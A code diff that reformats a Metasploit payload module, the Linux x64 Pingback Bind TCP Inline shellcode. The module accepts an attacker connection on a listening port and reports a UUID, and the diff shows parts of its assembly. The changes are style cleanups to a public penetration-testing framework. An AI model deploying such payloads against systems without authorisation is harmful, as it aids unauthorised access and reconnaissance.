@@ -3,10 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-
 module MetasploitModule
-
   CachedSize = 109
 
   include Msf::Payload::Linux::X64::Prepends
@@ -15,26 +12,31 @@ module MetasploitModule
   include Msf::Payload::Pingback::Options
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux x64 Pingback, Bind TCP Inline',
-      'Description'   => 'Accept a connection from attacker and report UUID (Linux x64)',
-      'Author'        => [ 'bwatters-r7' ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X64,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::Pingback
-    ))
-    def generate(opts={})
-      # 22 -> "0x00,0x16"
-      # 4444 -> "0x11,0x5c"
-      encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
-      encoded_host = Rex::Socket.addr_aton("0.0.0.0").unpack("V").first
-      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
-      self.pingback_uuid ||= self.generate_pingback_uuid
-      uuid_as_db = "0x" + pingback_uuid.chars.each_slice(2).map(&:join).join(",0x")
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux x64 Pingback, Bind TCP Inline',
+        'Description' => 'Accept a connection from attacker and report UUID (Linux x64)',
+        'Author' => [ 'bwatters-r7' ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::BindTcp,
+        'Session' => Msf::Sessions::Pingback
+      )
+    )
+  end
 
-      asm = %Q^
+  def generate(_opts = {})
+    # 22 -> "0x00,0x16"
+    # 4444 -> "0x11,0x5c"
+    encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack('N').first
+    encoded_host = Rex::Socket.addr_aton('0.0.0.0').unpack('V').first
+    encoded_host_port = format('0x%<encoded_host>.8x%<encoded_port>.8x', { encoded_host: encoded_host, encoded_port: encoded_port })
+    self.pingback_uuid ||= generate_pingback_uuid
+    uuid_as_db = '0x' + pingback_uuid.chars.each_slice(2).map(&:join).join(',0x')
+
+    asm = %^
           push   rsi
           push   rax
          ;SOCKET
@@ -91,7 +93,7 @@ module MetasploitModule
           xchg    rdi, rax                    ; grab client fd
         send_pingback:
           ; sys_write(fd:rdi, buf*:rsi, length:rdx)
-          push #{uuid_as_db.split(",").length}  ; length of the PINGBACK UUID
+          push #{uuid_as_db.split(',').length}  ; length of the PINGBACK UUID
           pop rdx                               ; length in rdx
           call get_uuid_address         ; put uuid buffer on the stack
           db #{uuid_as_db}  ; PINGBACK_UUID
@@ -108,7 +110,6 @@ module MetasploitModule
           pop    rdi
           syscall ; exit(1)
         ^
-      Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
-    end
+    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
   end
 end
